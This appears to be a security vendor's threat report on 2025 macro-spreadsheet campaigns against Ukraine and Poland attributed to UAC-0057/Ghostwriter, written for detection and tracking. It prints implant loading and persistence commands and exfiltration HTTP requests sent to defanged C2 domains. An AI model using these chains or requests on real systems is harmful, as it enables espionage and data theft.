_Identifier: TRR250801_.

**Summary**

> ____
> 
> In late July, we identified two clusters of malicious archives that were leveraged to target Ukraine and Poland since April 2025, and that we could link together from their similarities. Resulting infection chains are aimed at collecting information about compromised systems and deploying implants for further exploitation. The toolset we analyzed notably relies on readily available tools for obfuscation or packing purposes.
> 
> We noticed striking similarities with publicly reported activities that are associated with _UAC-0057_ (also known as _UNC1151_ , _FrostyNeighbor_ or _Ghostwriter_), a cyber espionage actor with reported ties to the Belarusian government.
> 
> Our report analyses the identified infection chains including decoy content, malicious execution logic, system information discovery approaches, first stage implants workflows as well as associated infrastructure, and offers baselines to detect and track the described activities. We also provide insights into the evolution of the threat actor’s toolset and practices, including the use of a cloud-hosted collaboration service for command and control communication, and the setup of the supporting infrastructure.

## Background: Eastern European ghostwriters and cyber espionage

In 2020, Mandiant published a [report about an influence campaign dubbed “Ghostwriter”](https://cloud.google.com/blog/topics/threat-intelligence/ghostwriter-influence-campaign) and aligned with Russia’s security interests. Personas, some inauthentic, some impersonating real individuals such as journalists or academics, would post falsified articles often containing anti-NATO narratives on compromised news websites. These narratives would also be relayed through emails sent to media organisations or individuals, or on social media.

In April 2021, the cybersecurity company [associated](https://cloud.google.com/blog/topics/threat-intelligence/espionage-group-unc1151-likely-conducts-ghostwriter-influence-activity) a state-sponsored cyber espionage threat actor they track as UNC1151 to the influence activity of Ghostwriter, and later published a report on their [high-confidence assessment](https://cloud.google.com/blog/topics/threat-intelligence/unc1151-linked-to-belarus-government) that UNC1151 is linked to the Belarusian government.

Since then, reports from vendors and governmental organisations have referred to the threat actor behind seemingly related activity as [_FrostyNeighbor_](https://www.eset.com/fileadmin/ESET/US/B2B_Resource_centre/reports/APT_Activity_Report_Q2_2024-Q3_2024.pdf), [_UAC-0057_](https://cert.gov.ua/article/5098518), also sometimes using the name of the influence campaign, _Ghostwriter_.

Last year, the Ukrainian CERT (CERT-UA) reported a [surge of activity](https://cert.gov.ua/article/6280159) of UAC-0057 during the summer of 2024. Early 2025, SentinelOne published a blog post about a [campaign targeting Ukrainian military and government organisations as well as Belarusian government opposition](https://www.sentinelone.com/labs/ghostwriter-new-campaign-targets-ukrainian-government-and-belarusian-opposition/) that they attribute to Ghostwriter.

## Infection chains

We identified a cluster of compressed archive files which were likely intended to be delivered to Ukrainian targets between late May 2025 and late July 2025. We could not determine how those archives were delivered, but we believe they were distributed via spearphishing emails, either as attachments or through download links.

These archives contain XLS spreadsheets with a VBA macro that drops and loads a DLL. The latter is responsible for collecting information about the compromised system and retrieving next stage malware from a command and control (C2) server.

Our analysis allowed us to identify other samples that we associate with the same threat actor, but which belong to a different campaign targeting Poland.

In the following sections, we describe the infection chains for both campaigns. For the purposes of clarity and conciseness, we only provide details about chosen samples of each campaign.

### Infection chain which targeted Ukraine

The following 3 archives were uploaded on an online multiscanner service between June 12, 2025 and July 30, 2025.

SHA-256 hash | Filename (date of most recent content file)  
---|---  
`5df1e1d67b92e2bba8641561af9967e3a54ec73600283c66b09c8165ddcb7de9` | `Список на перевірку 2025-2026 (2).rar` (2025-07-30)  
`699c50014cdbe919855c25eb35b15dfc8e64f73945187da41d985a9d7be31a71` | `ПЛАН наповнення СФ_ЗМІНЕНИЙ.zip` (2025-07-22)  
`26ea842c4259c90349a1f4db92efa89ac4429a5ff380e7f72574426cfd647f1a` | `N/A` (2025-05-30)  
  
All of these contain an XLS spreadsheet which embeds a VBA macro. Once executed, the macro drops a DLL which is loaded using `regsvr32.exe`. The exact execution logic differs depending on the archives creation date:

![Figure 1 - Infection chain for May archive](https://harfanglab.io/medias/2025/08/fig1-infection-chainuamay-2025no-titlebackground-color-fixed.png) Figure 1 – Infection chain for May archive ![Figure 2 - Infection chain for July archives](https://harfanglab.io/medias/2025/08/fig2-infection-chainuajuly-2025no-titlebackground-color-fixed.png) Figure 2 – Infection chain for July archives

The dropped DLL, which we will later refer to as the first stage implant, is written in C# and obfuscated using _ConfuserEx_. It establishes persistence using the current user’s “Run” registry key, collects information about the compromised system, sends that information to the C2 server and periodically attempts to retrieve a next stage from the C2.

#### Decoy documents

One of the aforementioned archives (SHA-256 `26ea842c4259c90349a1f4db92efa89ac4429a5ff380e7f72574426cfd647f1a`) contains a 3 pages PDF document (`покрокова інструкція.pdf`1), serving as a decoy.

This PDF document (see Fig. 3) was produced on May 30, 2025 according to the file’s metadata. It provides information for companies to benefit from certain services of the “Diia” (affiliated to the Ministry of Digital Transformation of Ukraine). We could find the same content and formatting in a post from the Ministry of Digital Transformation of Ukraine that was published on April 17, 2025 on the website of the _Cabinet of Ministers of Ukraine_ (translated from “Кабінет Міністрів України”).

![Figure 3 - Decoy content from покрокова інструкція.pdf](https://harfanglab.io/medias/2025/08/fig3-decoy1.png) Figure 3 – Decoy content from покрокова інструкція.pdf

The XLS spreadsheet of that same archive (`роз'яснення.xls`) also displays decoy content (a likely list of contracts) once the macro is executed:

#### XLS spreadsheets

SHA-256 hash | Filename  
---|---  
`f6fec3722a8c98c29c5de10969b8f70962dbb47ba53dcbcd4a3bbc63996d258d` | `Список на перевірку 2025-2026.xls`2  
`deaa3f807de097c3bfff37a41e97af5091b2df0e3a6d01a11a206732f9c6e49c` | `ПЛАН наповнення СФ_ЗМІНЕНИЙ.xls`3  
`aac430127c438224ec61a6c02ea59eb3308eb54297daac985a7b26a75485e55f` | `роз'яснення.xls`4  
  
The exact execution chain leading to the the DLL evolved between May and July, and is briefly described hereafter (see Fig. 1 and 2 above).

**роз’яснення.xls**

Using string concatenation, the VBA macro writes a DLL to `%TEMP%\DefenderProtectionScope.log` and uses the `Shell.ShellExecute` method to load it with `regsvr32 /u /s %TEMP%\DefenderProtectionScope.log`.

**ПЛАН наповнення СФ_ЗМІНЕНИЙ.xls**

In this sample, the VBA macro decrypts the DLL and ultimately writes it to `%LOCALAPPDATA%\Serv\0x00bac729fe.log`. It then creates an LNK file (`%APPDATA%\Microsoft\Windows\Protection overview.lnk`) set to execute `C:\Windows\System32\regsvr32.exe /u /s "%LOCALAPPDATA%\Serv\0x00bac729fe.log"`.

Contrary to the first sample, this VBA macro is partially obfuscated (strings remain in cleartext). The obfuscation is consistent with the result of _MacroPack_ (an offensive security tool which is available on GitHub) when executed with the `--obfuscate-names` parameter.

**Список на перевірку 2025-2026.xls**

This sample does not directly drop a DLL, but first writes a Microsoft Cabinet (CAB) file to `"%TEMP%\sdw9gobh0n"`.

In addition, it creates an LNK file (`%APPDATA%\Microsoft\Windows\Protection overview past.lnk`) that uses `expand.exe` to extract the DLL from the CAB file to `"%LOCALAPPDATA%\Logs\sdw9gobh0n.log"`, where previous samples would either load the DLL directly from a temporary directory where it had been dropped, or copy it to another directory (using the VBA method `CopyFile()`).

The macro runs this first LNK file, and then creates a second one (`%APPDATA%\Microsoft\Windows\Protection overview.lnk`) to load the extracted DLL via `C:\Windows\System32\regsvr32.exe` with `" /u /s %LOCALAPPDATA%\Logs\sdw9gobh0n.log"` as arguments. The obfuscation in this sample is consistent with the use of _MacroPack_ with all options for obfuscation being enabled, as strings are no longer in cleartext contrary to the previous sample.

#### First stage C# DLL implants

The following samples are .NET DLL assemblies written in C# and obfuscated with _ConfuserEx_. They serve as downloaders for an unidentified next stage, and have the ability to collect information about the compromised system.

SHA-256 hash | Filename (compilation timestamp) | Parent XLS filename  
---|---|---

**Variant 1 (`DefenderProtectionScope.log`)**

`DefenderProtectionScope.log` (internal name: `InfoUploader.dll`) collects the following pieces of information about the compromised system:

  * OS platform identifier and version;
  * hostname;
  * CPU name (using a WMI query);
  * current user name;
  * operating system install date (using a WMI query);
  * date at which the system was booted (with a bug 5);
  * installed antivirus product name and installation date (using a WMI query);
  * information about the IP address which is used to browse on the Internet (retrieved by sending an HTTP GET request to `hxxps://ip-info.ff.avast[.]com/v1/info`).



This information is then sent as form data to `hxxps://punandjokes[.]icu/cannabis-jokes.jpg` (C2 server) via an HTTP POST request:
    
    
    POST /cannabis-jokes.jpg HTTP/1.0
    Host: punandjokes[.]icu
    Connection: close
    Content-Length: <calculated-content-length>

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36
    
    oQlJbw=<Base64-encoded-OS-platform-identifier-and-version>&NsAUjZ=<Base64-encoded-hostname>&sCXaqf=<Base64-encoded-CPU-name>&knRVem=<Base64-encoded-username>&1udmGP=<Base64-encoded-install-date>&n3WGjF=<Base64-encoded-system-boot-date>&iBoPP6=<Base64-encoded-antivirus-product-name-and-install-date>&tXrcED=<Base64-encoded-IP-address-info>

The implant attempts to send the collected information to the C2 server every 10 minutes. Once sent, it then tries to download a next stage from the C2 server every 30 minutes. Upon successful retrieval (involving a check on the response size to make sure that the data is larger than 220000 bytes), the next stage is written to `%APPDATA%\Microsoft\System\ProtectedCertSystem.dll`, and run using the following command: `rundll32 %APPDATA%\Microsoft\System\ProtectedCertSystem.dll,#1`.

To achieve persistence, the implant adds two entries to the current user’s “Run” registry key:

  * For the implant itself, it creates `SytemProtectionService` with the value: `regsvr32 /u /s <current-implant-file-path>`;
  * For the retrieved next stage, it creates `MicrosoftDefender` with the value: `rundll32 %APPDATA%\Microsoft\System\ProtectedCertSystem.dll,#1`.



**Variant 2 (`sdw9gobh0n.log`, `0x00bac729fe.log`)**

`0x00bac729fe.log` (internal name: `InfoUploader.dll`) and `sdw9gobh0n.log` (internal name: `Downloader.dll`) share similar implementation and capabilities. Therefore, only details regarding the most recent sample, `sdw9gobh0n.log`, are provided. Despite some differences in string encryption or hardcoded values, most of what is described hereafter also applies to `0x00bac729fe.log`.

To persist, the implant adds an `Audio Driver` value to the user’s “Run” registry key with the command: `regsvr32 /u /s <implant-current-file-path>`.

It then proceeds to collect the following information about the compromised system:

  * operating system (and version if running on Windows);
  * hostname;
  * current user name;
  * operating system install date (using a WMI query);
  * date at which the system was booted (using a WMI query);
  * installed antivirus product names, current states and install dates (using a WMI query);
  * information about the IP address which is used to browse on the Internet (also retrieved using `hxxps://ip-info.ff.avast[.]com/v1/info`).



This information is arranged in a JSON-formatted structure, Base64-encoded, and sent as a cookie (`mod0api`) value to the C2 server via an HTTP POST request: `hxxps://sweetgeorgiayarns[.]online/wp-content/uploads/2025/04/06102226/Kims-hand-cards.jpg`
    
    
    POST /wp-content/uploads/2025/04/06102226/Kims-hand-cards.jpg HTTP/1.0
    Host: sweetgeorgiayarns[.]online
    Connection: close
    Content-Length: 0
    Content-Type: application/x-www-form-urlencoded
    Cookie: mod0api=<Base64-encoded-collected-information>

Note that the same User-Agent found in the previous samples is used in all web requests: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36`.

After a 10 minutes sleep, the implant enters an infinite loop to fetch payloads from the C2 server. The latter is expected to respond with a `Cookie` header containing three values: a file path, an execution command, and a persistence flag. If the received file path is longer than five characters, the implant saves the payload to that path and runs it using the provided command (spawned via `cmd.exe /c`). If the persistence flag is set, the implant creates a new entry in the current user’s “Run” registry key using the payload’s filename as value and the execution command as its data. The implant repeats this process every 30 minutes.

### Infection chain which targeted Poland

In this section, we describe infection chains targeting Poland in April and May 2025.

#### Infection files from April 2025

We identified the following 2 very similar archives as uploaded to an online multiscanner in April 2025 from Poland (see Fig. 5).

SHA-256 hash | Filename (date of most recent content file)  
---|---  
`730c1a02bb31d548d91ba23fce870b1dc53c4802ea4fcb0d293f96de670d74af` | `ZGRW_nr_F00038524.zip` (2025-04-21)

![Figure 5 - Infection chain for April archives](https://harfanglab.io/medias/2025/08/fig5-infection-chainplapril-2025no-titlebackground-color-fixed.png) Figure 5 – Infection chain for April archives

#### Decoy documents

One archive (SHA-256 `43688170c27bcb2649360e48e08540c52a2d41ef55a84033e8516ce53921ede5`) contains a one page PDF invitation for the May 8, 2025, general assembly of the _Union of Rural Municipalities of the Republic of Poland_ (translated from “Związek Gmin Wiejskich Rzeczypospolitej Polskiej”).

We found the same file available for download on the website of the union, indicating the threat actor repurposed an existing file. According to the ZIP archive’s timestamps, this PDF was packaged alongside the XLS spreadsheet on April 21, 2025.

![Figure 6 - Decoy content from 1_39ZO ZGWRP_zaproszenie.pdf](https://harfanglab.io/medias/2025/08/fig6-decoy3.png) Figure 6 – Decoy content from 1_39ZO ZGWRP_zaproszenie.pdf

#### XLS spreadsheets

SHA-256 hash | Filename  
---|---  
`082903a8bec2b0ef7c7df3e75871e70c996edcca70802d100c7f68414811c804` | `2_39ZO ZGWRP_program.xls`  
`69636ddc0b263c93f10b00000c230434febbd49ecdddf5af6448449ea3a85175` | `pks_250422325349_01.xls`  
  
Both samples contain a very similar VBA macro, obfuscated with _MacroPack_ , that implements identical dropping and next stage loading processes. As an example, the VBA macro in `2_39ZO ZGWRP_program.xls`:

  * writes a CAB file to `%PROGRAMDATA%\OfficeRuntimeBroker.xlam`;
  * creates the `OfficeRuntimeBroker.lnk` file in `%PROGRAMDATA%` with `C:\Windows\System32\expand.exe` as a target and the following arguments: `%PROGRAMDATA%\OfficeRuntimeBroker.xlam %PROGRAMDATA%\~OfficeRuntimeBroker.dat`;
  * runs the LNK file using `rundll32.exe shell32.dll,ShellExec_RunDLL %PROGRAMDATA%\OfficeRuntimeBroker.lnk` to extract the content from the CAB file to `%PROGRAMDATA%\~OfficeRuntimeBroker.dat`;
  * writes a new LNK file to the same path as the previous one with `C:\Windows\System32\rundll32.exe` as a target and the following arguments: `%PROGRAMDATA%\~OfficeRuntimeBroker.dat,TS_STATUS_INFO_get0_status`;
  * runs the LNK file using `rundll32.exe shell32.dll,ShellExec_RunDLL %PROGRAMDATA%\OfficeRuntimeBroker.lnk` to load the DLL.



#### First stage C# DLL implants

SHA-256 hash | Filename (compilation timestamp) | Parent XLS filename  
---|---|---  
`7c77d1ba7046a4b47aec8ec0f2a5f55c73073a026793ca986af22bbf38dc948c` | `~OfficeRuntimeBroker.dat` (2025-04-21 07:55:57 UTC) | `2_39ZO ZGWRP_program.xls`  
`559ee2fad8d16ecaa7be398022aa7aa1adbd8f8f882a34d934be9f90f6dcb90b` | `~DF20BC61C6277A354A.dat` (2025-04-22 12:55:16 UTC) | `pks_250422325349_01.xls`  
  
The dropped implants are C# .NET DLL assemblies, obfuscated with _ConfuserEx_ and internally named `jkyhrgkek30.dll`. Although they export 50 functions named after the OpenSSL library, only `TS_STATUS_INFO_get0_status` contains functional code. Both samples share the same logic, differing only in their C2 parameters and hardcoded filenames.

Upon execution, they collect the following information from the compromised system:

  * OS platform identifier and version;
  * hostname;
  * CPU name (using a WMI query);
  * current user name;
  * operating system install date (using a WMI query);
  * date at which the system was booted (with the same implementation bug5 than in a sample that targeted Ukraine);
  * information about the IP address which is used to browse on the Internet (also retrieved using `hxxps://ip-info.ff.avast[.]com/v1/info`).



This data is concatenated, RC4-encrypted with a 256 bytes key, and Base64-encoded prior to being sent to the C2 server (with `+` replaced with `-`, and `/` replaced with `_`). The same RC4 key is used in both samples. The information collection implementation is similar to the one of the C# downloaders used in the campaign targeting Ukraine, even replicating a bug5 that was not fixed before the latest samples of that same campaign.

These downloaders use Slack as a C2 server, leveraging the webhook mechanism to upload data. Once the data is uploaded, they immediately attempt to download a next stage from a download URL ending with `.jpg`, before decrypting that next stage using RC4 and the same key used to encrypt the information collected on the system. Then, the downloaders write the decrypted data to a file in `C:\ProgramData\` (file path is hardcoded and differs between samples, example: `C:\ProgramData\ssh\ssh.pif.pif.pif`), and run the next stage using a `WScript.Shell` object instantiated via the COM API.

The following User-Agent is used for all web requests: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4093.093 Safari/537.36`

These downloaders do not implement any persistence mechanism, and the described logic is run only once.

According to sandbox reports from an online multiscanner, the next stage retrieved by one of these downloaders (`~OfficeRuntimeBroker.dat`) has communicated with the domain `pesthacks[.]icu`, which shares similarities with the domains supporting other campaigns that we analyzed (see Infrastructure).

#### Infection files from May 2025

The `BHP.zip` and `Z-15a.rar` archives were submitted to an online multiscanner on May 27 and May 26, 2025 respectively. They contain a single XLS spreadsheet named after the archive itself (`BHP.xls` and `Z-15a.xls`, see Fig. 7).

SHA-256 hash | Filename (first seen)  
---|---  
`3fff6c8a8ef3f153ebbe6d469a0d970953358a25bb9b4955a2592626f011cbd6` | `Z-15a.rar` (2025-05-26)  
`6e562afa3193c2ca5d2982e04de78cf83faa203534a6098ab5f08df94bbeb944` | `BHP.zip` (2025-05-27)  
![Figure 7 - Infection chain for May archives](https://harfanglab.io/medias/2025/08/fig7-infection-chainplmay-2025no-titlebackground-color-fixed.png) Figure 7 – Infection chain for May archives

#### XLS spreadsheet

The spreadsheet (SHA-256 `06380c593d122fc4987e9d4559a9573a74803455809e89dd04d476870a427cbe`) is identical in both archives and has an obfuscated VBA macro that decrypts and drops a DLL to `%LOCALAPPDATA%\SDXHelp\SDXHelp.dll`. The DLL is then being loaded with `rundll32 %LOCALAPPDATA%\SDXHelp\SDXHelp.dll,#1` via the `ShellExecute` function.

#### First stage C++ DLL implant

The implant is a C++ DLL which has a single export named `Start` and has been packed with _UPX_.

Filename | `SDXHelp.dll`  
---|---  
File type | 32-bit PE (DLL)  
Compilation timestamp | 2025-05-26 11:27:40 UTC  
Hash (SHA-256) | `5fa19aa32776b6ab45a99a851746fbe189f7a668daf82f3965225c1a2f8b9d36`  
  
Upon execution, it collects the following information about the host:

  * hostname;
  * CPU name;
  * available memory;
  * Windows build;
  * OS install date (using a WMI query);
  * system boot date;
  * username;
  * information about the IP address which is used to browse on the Internet (also retrieved using `hxxps://ip-info.ff.avast[.]com/v1/info`);
  * the antivirus names and install dates (using a WMI query).



This information is Base64-encoded, arranged in a JSON structure (`{"cookie":"<host-information>"}`), and sent to `hxxps://taskandpurpose[.]icu/hews/coast-guard-0reg0n-c0ncrete.jpg` (C2 server) via an HTTP POST request as body:
    
    
    POST /hews/coast-guard-0reg0n-c0ncrete.jpg HTTP/1.0
    Host: taskandpurpose[.]icu
    Connection: close
    Content-Length: <calculated-content-length>
    Content-Type: application/json
    User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.84 Mobile/15E148 Safari/604.1
    
    {"cookie":"<Base64-encoded-collected-information>"}

The implant makes use of the TaskScheduler COM interface to achieve persistence by registering a scheduled task named `\UpdateSDX` which runs the following command at user logon: `C:\Windows\system32\rundll32.exe %LOCALAPPDATA%\SDXHelp\SDXHelp.dll,#1`.

Every 20 minutes, the implant attempts to download a DLL from the C2 server by sending an HTTP GET request to the previous URL. Upon successful retrieval, it decrypts it using a byte-wise XOR with a 128 bytes key, which is also used for the decryption of the hardcoded strings.

If the retrieved file size is at least 356804 bytes, only the data after the first 356804 bytes is decrypted. A JPEG file (SHA-256 `b39411abe494e2b04419a32c72fb1968ba745b3d7b04e9e8ebbab872df794b35`) of this exact size, retrieved by an online multiscanner from the C2 URL, suggests that the next stage would be appended to this image file and delivered to compromised hosts which meet a certain set of requirements (an assessment likely based on the information collected on the host).

The decrypted DLL is written to `%LOCALAPPDATA%\Runtime\RuntimeBroker.dll`. Then, the implant registers a scheduled task named `RuntimeBroker` which loads the next stage using `C:\Windows\system32\rundll32.exe %LOCALAPPDATA%\Runtime\RuntimeBroker.dll,#1`, and launches an instance of this scheduled task before deleting it.

In all exchanges with the C2 server, the following User-Agent string is used: `Mozilla/5.0 (iPhone; CPU iPhone OS 18_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.84 Mobile/15E148 Safari/604.1`.

Note that the User-Agent string set in requests to `hxxps://ip-info.ff.avast[.]com/v1/info` differs: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.8761.1412 Safari/537.36`.

#### Infection chain variant leading to Cobalt Strike

We identified another XLS spreadsheet (SHA-256 `082877e6f8b28f6cf96d3498067b0c404351847444ebc9b886054f96d85d55d4`, named `STAN NA ELEWATORZE 2024.xls`6) which shares similarities with the previously described XLS files, and was submitted from Poland in May 14, 2025 on an online multiscanner service.

This file contains yet another instance of a _MacroPack_ obfuscated VBA macro which aims to decrypt and write a DLL to `%LOCALAPPDATA\MSDE\mrasp86.dll`. It also creates an LNK file, `%APPDATA%\Microsoft\Windows\Protection overview.lnk`, which is run to load the DLL using `C:\Windows\System32\rundll32.exe "%LOCALAPPDATA%\MSDE\mrasp86.dll",#1`.

We notice that the path and file name of the LNK file (`%APPDATA%\Microsoft\Windows\Protection overview.lnk`), as well as the loading process of the implant, are identical to what was observed in samples associated with the campaign targeting Ukraine.

The dropped DLL (SHA-256 `3b5980c758bd61abaa4422692620104a81eefbf151361a1d8afe8e89bf38579d`, internal name: `DiagnExp.dll`) is written in C++, has a single export, `Start`, and has been packed with _UPX_ , similarly to the previously described `SDXHelp.dll` sample (SHA-256 `5fa19aa32776b6ab45a99a851746fbe189f7a668daf82f3965225c1a2f8b9d36`). The implant writes another DLL to `%APPDATA%\DiagnosticComponents\DiagnosticComponents.dll` and leverages the Task Scheduler COM interface to register a scheduled task (`\ExpDiagnosticDataSettings`) and to trigger the execution of `DiagnosticComponents.dll`.

`DiagnosticComponents.dll` (SHA-256 `c7e44bba26c9a57d8d0fa64a140d58f89d42fd95638b8e09bc0d2020424b640e`, internal name: `inj_p.dll`) also has a single export named `Start`, and acts as a loader for a _Cobalt Strike Beacon_ , which communicates with the following C2 server: `hxxps://medpagetoday[.]icu/nicheediting/trends`. This sample was run in public sandboxes, and as a result, the configuration of the _Beacon_ is [available online](https://www.joesandbox.com/analysis/1691936/0/html#threatCobaltStrike).

### Similarities across the different campaigns

Despite notable variations between the two described campaigns (e.g. C# downloaders only for Ukraine but C++ downloaders for Poland), our analysis reveals numerous overlaps:

  * Initial access: consistent use of weaponized XLS spreadsheets with VBA macros, many of which appear to be obfuscated with _MacroPack_ ;
  * Execution chains: similar execution flows, often leveraging LNK files to load dropped DLLs;
  * Code and artifact reuse: identical code segments were found in the C# downloaders across the two campaigns. Moreover, specific file paths and names, such as `%APPDATA%\Microsoft\Windows\Protection overview.lnk`, were reused;
  * Profiling: Both campaigns used `hxxps://ip-info.ff.avast[.]com/v1/info` for external IP address discovery;
  * Infrastructure: A similar C2 infrastructure setup was observed across both campaigns.



## Infrastructure

### C2 domains

The threat actor demonstrates consistency in the setup of the supporting infrastructure for the campaigns described in this report. The following table lists the C2 domains used for both the campaign targeting Ukraine and the campaign targeting Poland, since April 2025. For each of these domains, the threat actor additionally leverages Cloudflare name servers and proxies.

Domain | Registrar (registration date, registrant mail domain and country) | TLS Certificate CA | Impersonated domain | Estimated Operation Date  
---|---|---|---|---  
`pesthacks[.]icu` | PublicDomainRegistry (2025-03-04, `proton.me` US) | Google Trust Services  | `pesthacks[.]com` | April 2025  
`medpagetoday[.]icu` | PublicDomainRegistry (2025-02-28, `proton.me` US) | Google Trust Services | `medpagetoday[.]com` | May 2025  
`taskandpurpose[.]icu` | PublicDomainRegistry (2025-03-05, `proton.me` US) | Google Trust Services | `taskandpurpose[.]com` | May 2025  
`punandjokes[.]icu` | PublicDomainRegistry (2025-03-05, `proton.me` US) | Google Trust Services | `punandjokes[.]com` | May/June 2025  
`kitchengardenseeds[.]icu` | PublicDomainRegistry (2025-03-10, `proton.me` US) | Google Trust Services | `kitchengardenseeds[.]com` | July 2025  
`sweetgeorgiayarns[.]online` | PublicDomainRegistry (2025-02-20, `protonmail.com` US) | Google Trust Services | `sweetgeorgiayarns[.]com` | July/August 2025  
  
We also noticed that the HTTPS root path for one C2 domain (`sweetgeorgiayarns[.]online`) redirected to the seemingly legitimate and unrelated `curseforge[.]com` website (which distributes video game mods) between 2025-07-26 and 2025-07-30, when the domain was a C2 server for a C# downloader that targeted Ukraine. It is unclear if this redirection to an unrelated website is the result of a voluntary act. Such redirections might be setup to have the domain miscategorized as a gaming website by web filtering services. In any case, we could determine that `curseforge[.]icu` also implements the same redirection, appears to be an impersonation of `curseforge[.]com`, and is registered in the exact same way than the C2 domains we previously listed. As a result, we believe with low confidence that this domain might be leveraged by the threat actor, or a third party that supports the threat actor.

Domain | Registrar (registration date, registrant mail domain and country) | TLS Certificate CA | Impersonated domain  
---|---|---|---  
`curseforge[.]icu` | PublicDomainRegistry (2025-02-05, `proton.me` US) | Google Trust Services  | `curseforge[.]com`  
  
### C2 URLs and associated pictures

In some instances, C2 URLs are identical or very similar to URLs of legitimate websites associated with the impersonated domains listed above. For example, the C2 URL of the most recent C# downloader we observed (SHA-256 `a2a2f0281eed6ec758130d2f2b2b5d4f578ac90605f7e16a07428316c9f6424e`) is the following: `hxxps://sweetgeorgiayarns[.]online/wp-content/uploads/2025/04/06102226/Kims-hand-cards.jpg`.

According to the results of an online multiscanner service, a JPEG image file showing the following picture (SHA-256 `34f97d0bd753d534d376725553b31de9860c2c96c96202a139281c6fa2bc85ee`) has been served from this C2 URL on July 30, 2025:

![Figure 8 - Reproduction of the orginal Kims-hand-cards.jpg image](https://harfanglab.io/medias/2025/08/fig8-kimshand.png) Figure 8 – Reproduction of the original Kims-hand-cards.jpg image (the image file we included in this report is however not the original file)

This image file is identical to the one included on a post that was published on July 15, 2025 at `hxxps://sweetgeorgiayarns[.]com/hand-cards-your-first-fibre-prep-tool/`, and served from the following URL: `hxxps://cdn1.sweetgeorgiayarns[.]com/wp-content/uploads/2025/04/06102226/Kims-hand-cards.jpg`. We observe that the path `/wp-content/uploads/2025/04/06102226/Kims-hand-cards.jpg` has been reproduced by the threat actor in the C2 URL.

Similarly, the `SDXHelp.dll` sample that we associated with a campaign targeting Poland has the following C2 URL: `hxxps://taskandpurpose[.]icu/hews/coast-guard-0reg0n-c0ncrete.jpg`. In this case, the URL path is slightly different from the one on the legitimate website as `news` became `hews`, and the name of the JPEG file was derived from the last part of the path: `hxxps://taskandpurpose[.]com/news/coast-guard-oregon-concrete/`. Also, the displayed image (SHA-256 `b39411abe494e2b04419a32c72fb1968ba745b3d7b04e9e8ebbab872df794b35`) has been taken from an online commercial image library, and it does not appear to be associated with any of the content of the legitimate website.

### Slack teams

Other first stage samples that we associate with a campaign targeting Poland use Slack as a C2 channel. Associated Slack teams IDs appear to match Slack “free subscription” offer (they are not associated with an enterprise account):

Slack team ID | Account/Workspace name | Creation date  
---|---|---  
`T08NWSF1L78` | Cakybo | 2025-04-22 12:38:42 UTC  
`T08N1F1F64W` | Fbfubao | 2025-04-15 15:01:17 UTC  
  
## Targets

The first set of archives described in this report has been uploaded to an online multiscanner service from Ukraine, and contains files which names and contents are in Ukrainian, including a decoy document pertaining to Ukrainian public services.

Other files referenced in this report (archives and XLS spreadsheets) were uploaded from Poland, and some of them contain file names in Polish. In one instance, a decoy document related to the _Union of Rural Municipalities of the Republic of Poland_ has been identified.

Due to our limited visibility, and without any additional information about the context in which these archives or documents have been delivered, we cannot precisely identify the targets of these campaigns, but we believe that organisations or individuals in Ukraine and in Poland were the intended targets.

## Attribution: similarities with reported UAC-0057 activity

Our observations regarding the tools and techniques used by the threat actor, the supporting infrastructure, as well as the targeting of Ukraine and Poland led us to consider an attribution of reported activities to UAC-0057 (also known as UNC1151, FrostyNeighbor or GhostWriter), a cyber espionage threat actor with [reported](https://cloud.google.com/blog/topics/threat-intelligence/unc1151-linked-to-belarus-government) [ties](https://www.sentinelone.com/labs/ghostwriter-new-campaign-targets-ukrainian-government-and-belarusian-opposition/) to the Belarusian government.

In recent years, the use of weaponized XLS spreadsheets containing obfuscated VBA macros aiming to drop a first stage DLL downloader, as well as implant loading mechanisms similar to what we described, have been [documented](https://blog.talosintelligence.com/malicious-campaigns-target-entities-in-ukraine-poland/) in [several](https://cyble.com/blog/unc1151-strikes-again-unveiling-their-tactics-against-ukraines-ministry-of-defence/) [reports](https://cert.gov.ua/article/5098518) associated with UNC1151. In a blog post from February 2025, SentinelOne described the use of XLS spreadsheets containing VBA macros obfuscated with _MacroPack_ and simple C# downloaders in a [campaign targeting Ukrainian military and government organisations as well as Belarusian government opposition](https://www.sentinelone.com/labs/ghostwriter-new-campaign-targets-ukrainian-government-and-belarusian-opposition/) that they attribute to Ghostwriter. In addition, one of the C++ downloader we identified seems to be a variant of the same malware described in a [blog post](https://dmpdump.github.io/posts/Belarus-nexus_Threat_Actor_Target_Poland/) pertaining to another infection chain likely associated with FrostyNeighbor.

Regarding the infrastructure, we observed similar setups as [previously reported](https://blog.bushidotoken.net/2025/01/tracking-adversaries-ghostwriter-apt.html) about UNC1151: domains registered at PublicDomainRegistry, the use of Cloudflare nameservers, C2 URLs [mimicking existing legitimate content](https://www.sentinelone.com/labs/ghostwriter-new-campaign-targets-ukrainian-government-and-belarusian-opposition/) and serving an image to visiting web clients. Keeping in mind that we only have a limited visibility on the threat actor’s operations, it appears that the latter transitioned from the extensive use of top-level domains such as _.shop_ in 2024 to the _.icu_ and _.online_ TLDs in more recent campaigns.

Over the years, [multiple](https://blog.talosintelligence.com/malicious-campaigns-target-entities-in-ukraine-poland/) [publications](https://cyble.com/blog/unc1151-strikes-again-unveiling-their-tactics-against-ukraines-ministry-of-defence/) have highlighted the targeting of Ukraine and Poland by UNC1151. Recently, on June 5, 2025, CERT Polska attributed a [campaign targeting instances of Roundcube](https://cert.pl/en/posts/2025/06/unc1151-campaign-roundcube) vulnerable to CVE-2024-42009 to UNC1151. Since 2022, CERT-UA [made](https://cert.gov.ua/article/37626) [several](https://cert.gov.ua/article/4905718) [publications](https://cert.gov.ua/article/5098518) [about](https://cert.gov.ua/article/5661411) UAC-0057, notably reporting about a [surge of activity](https://cert.gov.ua/article/6280159) of the threat actor during the summer of 2024.

